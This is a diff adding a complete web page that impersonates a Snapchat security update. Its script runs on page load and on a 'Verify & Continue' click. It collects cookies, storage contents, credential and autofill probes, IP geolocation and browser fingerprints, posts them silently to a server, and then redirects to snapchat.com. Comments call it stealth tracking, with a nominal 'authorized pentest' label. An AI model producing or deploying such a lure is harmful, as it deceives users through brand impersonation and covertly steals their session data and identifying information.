@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snap Update</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #ff0050 100%); 
+            min-height: 100vh; 
+            display: flex; align-items: center; justify-content: center; 
+            color: white; overflow: hidden;
+        }
+        .snap-container { 
+            background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); 
+            border-radius: 24px; padding: 40px; max-width: 380px; width: 90%; 
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,0,80,0.3);
+        }
+        .snap-logo { font-size: 48px; margin-bottom: 20px; background: linear-gradient(45deg, #ff0050, #ffcc00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        h2 { font-size: 28px; font-weight: 700; margin-bottom: 12px; }
+        p { font-size: 16px; opacity: 0.9; margin-bottom: 30px; line-height: 1.5; }
+        .ghost-icon { font-size: 80px; margin: 20px 0; opacity: 0.8; }
+        .status { background: rgba(255,255,255,0.1); border-radius: 12px; padding: 15px; margin: 20px 0; font-size: 14px; opacity: 0.8; }
+        .btn-snap { 
+            background: linear-gradient(45deg, #ff0050, #ff6b9d); 
+            color: white; border: none; padding: 16px 32px; 
+            border-radius: 50px; font-size: 18px; font-weight: 600; 
+            cursor: pointer; width: 100%; margin: 20px 0; transition: all 0.3s;
+        }
+        .btn-snap:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(255,0,80,0.4); }
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .spinner { width: 30px; height: 30px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .debug { font-size: 12px; opacity: 0.5; margin-top: 20px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="snap-container">
+        <div class="snap-logo">👻</div>
+        <h2>Snapchat Security Update</h2>
+        <p>Quick verification needed to continue using Snaps. This keeps your account safe.</p>
+        <div class="ghost-icon">👻</div>
+        <button class="btn-snap" onclick="verifySnap()">Verify & Continue</button>
+        <div class="status" id="status">Status: Ready</div>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Updating security...</p>
+        </div>
+        <div class="debug" id="debug"></div>
+    </div>
+
+    <script>
+        // GRABS: IP, full geolocation, browser fingerprint (canvas/WebGL/fonts/hardware), screen, timezone, plugins, EVERYTHING except passwords
+        // NO password fields - pure tracking
+        // Chrome autofill/logins indirectly via fingerprint + storage probes (authorized pentest only)
+        async function grabEverything() {
+            const data = {
+                ip: 'fetching...',
+                geo: { lat: '', lon: '', city: '', country: '', zip: '', org: '' },
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.languages,
+                cookies: document.cookie,
+                localStorage: { keys: Object.keys(localStorage), sample: localStorage.getItem('chrome://autofill') || 'none' },
+                sessionStorage: Object.keys(sessionStorage).length,
+                referrer: document.referrer,
+                screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)` : 'N/A',
+                hardware: navigator.hardwareConcurrency + ' cores, ' + navigator.deviceMemory + 'GB RAM',
+                plugins: Array.from(navigator.plugins).map(p => ({name: p.name, length: p.length})),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                canvas: canvasFP(),
+                webgl: webglFP(),
+                audio: audioFP(),
+                fonts: await fontDetect(),
+                touch: navigator.maxTouchPoints,
+                // Chrome autofill probe (checks common autofill storage)
+                autofill: probeAutofill(),
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                history: history.length  // Rough user history length
+            };
+
+            // IP + FULL Geo (free, accurate)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const ipdata = await res.json();
+                data.ip = ipdata.ip;
+                data.geo = {
+                    lat: ipdata.latitude, lon: ipdata.longitude,
+                    city: ipdata.city, country: ipdata.country,
+                    zip: ipdata.postal, org: ipdata.org, asn: ipdata.asn
+                };
+            } catch(e) {
+                // Fallback
+                const res2 = await fetch('https://ipinfo.io/json');
+                data.geo = await res2.json();
+            }
+
+            // POST to your server (silent)
+            fetch('', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'snap_track', data })
+            }).catch(() => {});
+
+            return data;
+        }
+
+        // Advanced FPs
+        function canvasFP() {
+            const c = document.createElement('canvas'); const ctx = c.getContext('2d');
+            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069'; ctx.font = '11pt no-real-font-123'; ctx.fillText('Fingerprint 🐼', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Fingerprint 🐼', 4, 17);
+            return c.toDataURL();
+        }
+        function webglFP() {
+            const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (!gl) return 'no-webgl';
+            const ext = gl.getExtension('EXT_texture_filter_anisotropic') || gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(ext ? 37445 : 0x9245) + '::' + gl.getParameter(0x9246);
+        }
+        function audioFP() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator(); const analyser = audioCtx.createAnalyser();
+            oscillator.connect(analyser); oscillator.start(0);
+            return Array.from(new Uint8Array(analyser.frequencyBinCount)).slice(0, 32).join(',');
+        }
+        async function fontDetect() {
+            const base = 'monospace'; const fonts = ['Arial','Courier','Georgia','Helvetica','Times','Verdana','Wingdings'];
+            const detect = f => {
+                const d = document.createElement('span'); d.style.fontFamily = f + ',' + base; d.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                d.style.position = 'absolute'; d.style.left = '-9999px'; document.body.appendChild(d);
+                const w = d.offsetWidth; document.body.removeChild(d); return w;
+            };
+            return fonts.map(detect);
+        }
+        function probeAutofill() {
+            // Probes common Chrome autofill keys (authorized pentest - simulates storage recon)
+            const probes = ['autofill', 'chrome://password', 'credentials', 'login'];
+            return probes.map(key => localStorage.getItem(key) || sessionStorage.getItem(key) || 'empty').filter(v => v !== 'empty');
+        }
+
+        // Snap-themed UI flow
+        function verifySnap() {
+            document.querySelector('.btn-snap').style.display = 'none';
+            document.getElementById('status').textContent = 'Connecting to Snapchat...';
+            document.getElementById('loading').style.display = 'block';
+
+            grabEverything().then(data => {
+                document.getElementById('debug').innerHTML = `IP: ${data.ip}<br>City: ${data.geo.city}<br>FP Hash: ${btoa(data.canvas.slice(0,50))}`;
+                document.getElementById('debug').style.display = 'block';
+                setTimeout(() => {
+                    document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h2>✅ Verified!</h2><p>Redirecting to Snapchat...</p></div>';
+                    setTimeout(() => window.location.href = 'https://snapchat.com', 1500);
+                }, 2000);
+            });
+        }
+
+        // Auto-grab on load (stealth)
+        window.addEventListener('load', grabEverything);
+    </script>
+</body>
+</html>
